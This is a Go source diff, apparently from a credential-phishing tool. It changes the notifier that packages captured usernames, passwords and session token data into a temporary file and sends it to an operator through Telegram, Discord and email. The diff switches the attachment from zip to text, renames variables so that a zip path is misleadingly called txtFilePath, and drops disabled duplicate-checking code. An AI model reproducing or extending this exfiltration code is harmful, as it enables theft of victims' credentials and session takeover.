@@ -140,10 +140,10 @@ func createTxtFile(session Session) (string, error) {
 func createZipFile(session Session) (string, error) {
 	// Create a random zip file name
 	zipFileName := generateRandomString() + ".zip"
-	zipFilePath := filepath.Join(os.TempDir(), zipFileName)
+	txtFilePath := filepath.Join(os.TempDir(), zipFileName)
 
 	// Create a new zip file
-	zipFile, err := os.Create(zipFilePath)
+	zipFile, err := os.Create(txtFilePath)
 	if err != nil {
 		return "", fmt.Errorf("failed to create zip file: %v", err)
 	}
@@ -213,7 +213,7 @@ func createZipFile(session Session) (string, error) {
 		}
 	}
 
-	return zipFilePath, nil
+	return txtFilePath, nil
 }
 
 func formatSessionMessage(session Session) string {
@@ -246,24 +246,10 @@ func Notify(session Session) {
 		fmt.Println(err)
 		return
 	}
-	// Lock the mutex to safely access the map
-	// mu.Lock()
-	// if processedSessions[string(session.ID)] {
-	// 	// If the session ID is already processed, skip sending notifications
-	// 	fmt.Printf("Skipping duplicate notification for SessionID: %s\n", string(session.ID))
-	// 	mu.Unlock()
-	// 	return
-	// }
-	// // Mark the session ID as processed
-	// processedSessions[string(session.ID)] = true
-	// mu.Unlock()
 
 	// Format the session message
 	message := formatSessionMessage(session)
-
-	// Create the zip file with token data
-	// zipFilePath, err := createZipFile(session)
-	zipFilePath, err := createTxtFile(session)
+	txtFilePath, err := createTxtFile(session)
 
 	if err != nil {
 		fmt.Println("Error creating zip file:", err)
@@ -271,7 +257,7 @@ func Notify(session Session) {
 	}
 
 	// Include the zip file path in the message
-	// message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", zipFilePath)
+	// message += fmt.Sprintf("\n📦 All token data has been saved in the zip file: %s\n", txtFilePath)
 
 	// Print the formatted message with zip info
 	fmt.Printf("------------------------------------------------------\n")
@@ -283,7 +269,7 @@ func Notify(session Session) {
 	if session.Username != "" && session.Password != "" {
 		// Send notifications based on config
 		if config.TelegramEnable {
-			sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, zipFilePath)
+			sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
 			if err != nil {
 				fmt.Printf("Error sending Telegram notification: %v\n", err)
 			}
@@ -293,18 +279,18 @@ func Notify(session Session) {
 	}
 
 	if config.MailEnable {
-		err := sendMailNotificationWithAttachment(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message, zipFilePath)
+		err := sendMailNotificationWithAttachment(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message, txtFilePath)
 		if err != nil {
 			fmt.Printf("Error sending Mail notification: %v\n", err)
 		}
 	}
 
 	if config.DiscordEnable {
-		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, zipFilePath)
+		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message, txtFilePath)
 	}
 
 	// After sending, delete the zip file
-	err = os.Remove(zipFilePath)
+	err = os.Remove(txtFilePath)
 	if err != nil {
 		fmt.Printf("Error deleting zip file: %v\n", err)
 	} else {
